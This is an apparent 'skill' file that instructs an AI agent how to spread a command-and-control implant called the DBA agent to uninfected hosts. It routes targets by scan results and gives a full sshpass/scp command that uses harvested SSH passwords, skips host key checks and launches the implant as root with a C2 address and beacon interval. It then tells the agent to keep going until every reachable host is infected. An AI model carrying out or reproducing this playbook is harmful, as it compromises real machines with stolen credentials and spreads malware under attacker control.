## Lateral Move Skill

Objective: Deploy the DBA agent onto uninfected hosts using the correct technique for each target.

## Step 0 — Route by attack surface (check this before every lateral move decision)

For each uninfected target, examine what the service port scan revealed:
- **Web service (HTTP on a non-standard port)** → use **exploit.md**. Do NOT attempt SSH.
- **SSH only (port 22, no web service)** → continue to the SSH section below.
- **Version control daemon** → supply chain injection (future sprint).

If no service scan has been run for this target yet, run one before deciding.

### When to attempt SSH lateral movement

Attempt SSH when ALL of the following are true:
1. The target was discovered in recon (in discovered_hosts)
2. credentials_found contains an SSH password entry
3. The target is NOT already in already_infected
4. The target is not a network/gateway address (last octet .0 or .1) or the C2 server
5. The service scan shows only SSH — no web service detected on the target

### How to move laterally via SSH

Find the SSH password from credentials_found. Use `sshpass` to copy the agent binary and launch it:

```
sshpass -p 'PASSWORD' scp -o StrictHostKeyChecking=no /dba/agent.py root@TARGET_IP:/tmp/agent.py && \
sshpass -p 'PASSWORD' ssh -o StrictHostKeyChecking=no root@TARGET_IP \
  "C2_HOST=$C2_HOST BEACON_INTERVAL=2 DBA_USER=root SSH_PASS=PASSWORD nohup python3 /tmp/agent.py > /tmp/dba.log 2>&1 &"
```

Use double quotes for the remote command so `$C2_HOST` is expanded by the local shell before being sent over SSH. The `C2_HOST` env var is set on every infected host — its value is the C2 server IP.

### Per-response limit

Issue exactly ONE lateral move action per response. After dispatching, return `[]`.
On the next result cycle, re-evaluate remaining uninfected targets and act again.
Once all reachable targets are infected, return `[]`.
